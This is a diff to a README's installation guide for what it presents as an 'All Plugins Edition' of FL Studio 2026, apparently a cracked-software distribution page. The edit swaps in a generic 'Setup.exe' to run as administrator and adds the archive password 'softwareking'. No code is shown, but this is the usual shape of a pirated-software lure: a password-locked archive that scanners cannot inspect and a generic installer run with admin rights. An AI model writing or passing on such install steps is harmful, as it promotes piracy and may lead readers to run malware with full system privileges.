@@ -29,11 +29,11 @@ FL Studio 2026 All Plugins Edition includes over 115 instruments, effects, and s
 
 ## 📥 Installation Guide
 
-1. Download the official ZIP archive of **FL Studio 26.1.3.5570 – All Plugins Edition**.
+1. Download the official ZIP archive of **FL-Studio26–APE**.
 2. Extract the archive to any folder using 7-Zip, WinRAR, or the built-in Windows extractor.
-3. Right-click `FL-Studio-26.1.3.5570.exe` and select **Run as administrator** if required.
+3. Right-click `Setup.exe` and select **Run as administrator** if required.
 4. Follow the on-screen instructions to complete the installation.
-> ⚠️ Administrator privileges may be required to install drivers or register system components.
+> ⚠️ Password for the archive is: softwareking
 
 
 
